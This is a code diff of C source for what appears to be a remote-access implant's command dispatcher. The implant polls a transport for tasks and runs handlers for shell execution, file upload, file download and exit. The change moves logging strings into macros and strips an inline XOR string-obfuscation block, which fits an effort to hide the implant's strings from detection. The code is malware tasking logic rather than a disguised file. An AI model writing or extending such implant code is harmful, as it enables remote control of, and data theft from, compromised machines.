@@ -5,9 +5,10 @@
 #include <Core.h>
 #include <Config.h>
 
-#include <tchar.h>
-
+#include <CommandStrings.h>
 #include <ObfuscateStrings.h>
+
+#include <tchar.h>
 
 #define REVNT_COMMAND_LENGTH 5
 
@@ -26,25 +27,12 @@ VOID CommandDispatcher()
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand = 0;
 
-#if CONFIG_OBF_STRINGS
-
-    uintptr_t unique_key = UNIQUE_KEY();
-    // encrypted string generated at compile time
-    const char encrypted_str[] = XOR_STRING("Command Dispatcher...", UNIQUE_KEY());
-
-    // decrypt string
-    char decrypted_str[sizeof(encrypted_str)];
-    xor_decrypt(decrypted_str, encrypted_str, UNIQUE_KEY(), sizeof(encrypted_str) - 1);
-
-    _tprintf("%s\n", decrypted_str);
-#else
-    _tprintf("%s\n","Command Dispatcher...");
-#endif
+    COMMAND_DISPATCHER();
 
     do
     {
         if ( ! Instance.Session.Connected ){
-            _tprintf("Instance not connected...\n");
+            INSTANCE_NOT_CONNECTED();
             return;
         }
 
@@ -67,7 +55,7 @@ VOID CommandDispatcher()
 
                 if ( TaskCommand != COMMAND_NO_JOB )
                 {
-                    printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
+                    _tprintf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
 
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < REVNT_COMMAND_LENGTH; FunctionCounter++ )
@@ -81,9 +69,9 @@ VOID CommandDispatcher()
                     }
 
                     if ( ! FoundCommand )
-                        _tprintf( "Command not found !!\n" );
+                        COMMAND_NOT_FOUND();
 
-                } else _tprintf( "Is COMMAND_NO_JOB\n" );
+                } else IS_COMMAND_NO_JOB();
 
             } while ( Parser.Length > 4 );
 
@@ -96,7 +84,7 @@ VOID CommandDispatcher()
         }
         else
         {
-            _tprintf( "Transport: Failed\n" );
+            TRANSPORT_FAILED();
             break;
         }
 
@@ -107,7 +95,8 @@ VOID CommandDispatcher()
 
 VOID CommandShell( PPARSER Parser )
 {
-    _tprintf( "Command::Shell\n" );
+
+    C_COMMAND_SHELL();
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
@@ -154,7 +143,7 @@ VOID CommandShell( PPARSER Parser )
 
 VOID CommandUpload( PPARSER Parser )
 {
-    _tprintf( "Command::Upload\n" );
+    C_COMMAND_UPLOAD();
 
     PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
     UINT32   FileSize = 0;
@@ -166,7 +155,7 @@ VOID CommandUpload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    printf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );
+    _tprintf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );
 
     hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
@@ -194,7 +183,7 @@ Cleanup:
 
 VOID CommandDownload( PPARSER Parser )
 {
-    _tprintf( "Command::Download\n");
+    C_COMMAND_DOWNLOAD();
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
     DWORD    FileSize = 0;
@@ -206,12 +195,12 @@ VOID CommandDownload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    printf( "FileName => %s\n", FileName );
+    _tprintf( "FileName => %s\n", FileName );
 
     hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
     {
-        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
+        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
         goto CleanupDownload;
     }
 
@@ -247,7 +236,7 @@ CleanupDownload:
 
 VOID CommandExit( PPARSER Parser )
 {
-    _tprintf( "Command::Exit" );
+    C_COMMAND_EXIT();
 
     ExitProcess( 0 );
 }
